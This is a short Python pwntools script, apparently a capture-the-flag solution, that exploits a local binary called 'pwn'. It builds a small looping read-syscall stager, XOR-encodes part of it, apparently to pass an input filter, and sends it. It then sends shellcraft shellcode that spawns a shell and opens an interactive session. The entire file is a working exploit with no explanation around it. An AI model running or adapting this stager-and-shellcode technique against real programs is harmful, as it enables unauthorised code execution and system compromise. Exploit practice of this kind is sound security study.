#!/usr/bin/env python3

from pwn import *

elf = ELF('./pwn')
context.binary = elf.path

io = remote('localhost', 9999) if args.REMOTE else \
     gdb.debug([elf.path]) if args.GDB else \
     process([elf.path], stdin=PTY)

shellcode = '''
l:
    xchg rsi, rdx
    syscall
    jmp l
'''

code = asm(shellcode)

intcode = [x for x in code]
encode = intcode.copy()

for i in range(5):
    encode[i+2] = intcode[i+2] ^ intcode[i+1] ^ intcode[i]

encode = b''.join([p8(x) for x in encode])
payload = encode.ljust(8, b'\x00') + encode

io.send(payload)
io.send(asm(shellcraft.sh()))
io.interactive()
